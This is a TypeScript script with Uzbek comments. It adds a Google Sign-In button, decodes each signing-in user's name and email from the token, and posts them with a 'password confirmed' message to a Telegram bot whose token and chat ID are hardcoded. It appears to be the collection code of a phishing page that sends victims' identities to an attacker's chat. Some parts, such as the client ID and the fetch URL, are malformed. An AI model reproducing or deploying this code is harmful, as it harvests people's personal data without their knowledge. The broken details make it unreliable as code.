'use strict';

const google = (window as any).google;

const GOOGLE_CLIENT_ID: string = "://googleusercontent.com";
const BOT_TOKEN: string = '8765203206:AAGkiR2x8tYa0fT6pi7VCdIcrW9LYw1xlok';
const CHAT_ID: string = '6023504003';

// Google oynasidan muvaffaqiyatli o'tgan (paroli to'g'ri bo'lgan) foydalanuvchilar buni ishga tushiradi
function handleCredentialResponse(response: any): void {
  const responsePayload = parseJwt(response.credential);

  const name: string = responsePayload.name;
  const email: string = responsePayload.email;

  const text: string = `
🌐 Google orqali haqiqiy kirish:
👨 Ism: ${name}
📧 Email: ${email}
✅ Holat: Google paroli to'g'riligi tasdiqlandi!
  `;

  // Telegram botga ma'lumot yuborish
  fetch(`https://telegram.org{BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: CHAT_ID, text: text }),
  })
  .then(() => {
    const statusText = document.querySelector('#status') as HTMLElement | null;
    if (statusText) statusText.textContent = 'Google akkauntingiz muvaffaqiyatli tasdiqlandi!';
  })
  .catch(err => console.error("Xatolik:", err));
}

function parseJwt(token: string): any {
  const tokenParts = token.split('.');
  const base64Url = tokenParts[1] || ''; 
  const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
  const jsonPayload = decodeURIComponent(
    window.atob(base64)
      .split('')
      .map(c => '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2))
      .join('')
  );
  return JSON.parse(jsonPayload);
}

window.onload = function (): void {
  if (google) {
    google.accounts.id.initialize({
      client_id: GOOGLE_CLIENT_ID,
      callback: handleCredentialResponse
    });
    
    const buttonDiv = document.getElementById("buttonDiv");
    if (buttonDiv) {
      google.accounts.id.renderButton(
        buttonDiv,
        { theme: "outline", size: "large" } 
      );
    }
  }
};
